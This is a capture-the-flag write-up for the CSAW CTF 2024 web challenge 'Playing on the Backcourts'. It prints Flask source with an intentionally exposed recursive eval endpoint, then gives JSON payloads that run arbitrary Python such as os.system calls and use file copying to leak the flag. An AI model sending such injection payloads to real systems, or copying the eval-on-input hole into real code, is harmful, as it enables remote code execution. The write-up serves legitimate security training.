---
name: Playing on the Backcourts (2024)
event: CSAW CTF 2024
category: Web
description: Writeup for Playing on the Backcourts (Web) - CSAW CTF (2024) 💜
layout:
    title:
        visible: true
    description:
        visible: true
    tableOfContents:
        visible: true
    outline:
        visible: true
    pagination:
        visible: true
---

# Playing on the Backcourts

## Description

> yadayada playing tennis like pong yadayada someone's cheating yadayada at least the leaderboard is safe!

## Source Code

{% code overflow="wrap" %}

```python
from flask import Flask, render_template, request, session, jsonify, send_file
from hashlib import sha256
from os import path as path

app = Flask(__name__)
app.secret_key = 'safe'

leaderboard_path = 'leaderboard.txt'
safetytime = 'csawctf{i_look_different_in_prod}'

@app.route('/')
def index() -> str:
    cookie = request.cookies.get('session')

    if cookie:
        token = cookie.encode('utf-8')
        tokenHash = sha256(token).hexdigest()

        if tokenHash == '25971dadcb50db2303d6a68de14ae4f2d7eb8449ef9b3818bd3fafd052735f3b':
            try:
                with open(leaderboard_path, 'r') as file:
                    lbdata = file.read()

            except FileNotFoundError:
                lbdata = 'Leaderboard file not found'

            except Exception as e:
                lbdata = f'Error: {str(e)}'

            return '<br>'.join(lbdata.split('\n'))

    open('logs.txt', mode='w').close()
    return render_template("index.html")

@app.route('/report')
def report() -> str:
    return render_template("report.html")

@app.route('/clear_logs', methods=['POST'])
def clear_logs() -> Flask.response_class:
    try:
        open('logs.txt', 'w').close()

        return jsonify(status='success')

    except Exception as e:
        return jsonify(status='error', reason=str(e))

@app.route('/submit_logs', methods=['POST'])
def submit_logs() -> Flask.response_class:
    try:
        logs = request.json

        with open('logs.txt', 'a') as logFile:
            for log in logs:
                logFile.write(f"{log['player']} pressed {log['key']}\n")

        return jsonify(status='success')

    except Exception as e:
        return jsonify(status='error', reason=str(e))

@app.route('/get_logs', methods=['GET'])
def get_logs() -> Flask.response_class:
    try:
        if path.exists('logs.txt'):
            return send_file('logs.txt', as_attachment=False)
        else:
            return jsonify(status='error', reason='Log file not found'), 404

    except Exception as e:
        return jsonify(status='error', reason=str(e))

@app.route('/get_moves', methods=['POST'])
def eval_moves() -> Flask.response_class:
    try:
        data = request.json
        reported_player = data['playerName']
        moves = ''
        if path.exists('logs.txt'):
            with open('logs.txt', 'r') as file:
                lines = file.readlines()

                for line in lines:
                    if line.strip():
                        player, key = line.split(' pressed ')
                        if player.strip() == reported_player:
                            moves += key.strip()

        return jsonify(status='success', result=moves)

    except Exception as e:
        return jsonify(status='error', reason=str(e))

@app.route('/get_eval', methods=['POST'])
def get_eval() -> Flask.response_class:
    try:
        data = request.json
        expr = data['expr']

        return jsonify(status='success', result=deep_eval(expr))

    except Exception as e:
        return jsonify(status='error', reason=str(e))

def deep_eval(expr:str) -> str:
    try:
        nexpr = eval(expr)
    except Exception as e:
        return expr

    return deep_eval(nexpr)

if __name__ == '__main__':
    app.run(host='0.0.0.0')
```

{% endcode %}

## Solution

The website features a two-player ping pong game. Aside from the player movements, there's some log storing/reading functionality, a `/report` endpoint, and a `get_eval` endpoint.

The last one sounds very interesting! It performs a `deep_eval` on our expression (recursive), so first, we can try an easy win: print the `safetytime` variable.

{% code overflow="wrap" %}

```json
{ "expr": "safetytime" }
```

{% endcode %}

We get a flag!

{% code overflow="wrap" %}

```json
{ "result": "csawctf{7h1s_1S_n07_7h3_FL49_y0u_4R3_l00K1n9_f0R}", "status": "success" }
```

{% endcode %}

Clearly, not the real flag though. We can try system commands, e.g.

{% code overflow="wrap" %}

```json
{ "expr": "__import__('os').system('ls')" }
```

{% endcode %}

They seem to succeed but there's no output.

{% code overflow="wrap" %}

```json
{ "result": 0, "status": "success" }
```

{% endcode %}

I tried `curl` but didn't get a hit.

Next, I was thinking the flag must be in `leaderboard.txt`, which we would get with the correct hash.

{% code overflow="wrap" %}

```python
token = cookie.encode('utf-8')
tokenHash = sha256(token).hexdigest()

if tokenHash == '25971dadcb50db2303d6a68de14ae4f2d7eb8449ef9b3818bd3fafd052735f3b':
	try:
		with open(leaderboard_path, 'r') as file:
			lbdata = file.read()
```

{% endcode %}

I tried to crack it online but no luck.

Finally, I used the `eval` to copy `logs.txt` to `leaderboard.txt` and then called `/get_logs`.

{% code overflow="wrap" %}

```
1.kainzow
2.wozniak
3.beastmaster64
4.m4y4
5.smallfoot
6.BBLDrizzy
7.¯\_(ツ)_/¯
8.dvorak
9.csawctf{5H1774K3_Mu5Hr00M5_1_fuX0R3d_Up_50n_0F_4_81207CH}
10.funGuyQiu
11.bidenJoetum pressed k
tum pressed k
tum pressed k
tum pressed k
hum pressed w
hum pressed w
hum pressed w
hum pressed w
hum pressed w
hum pressed s
hum pressed s
```

{% endcode %}

Flag: `csawctf{5H1774K3_Mu5Hr00M5_1_fuX0R3d_Up_50n_0F_4_81207CH}`
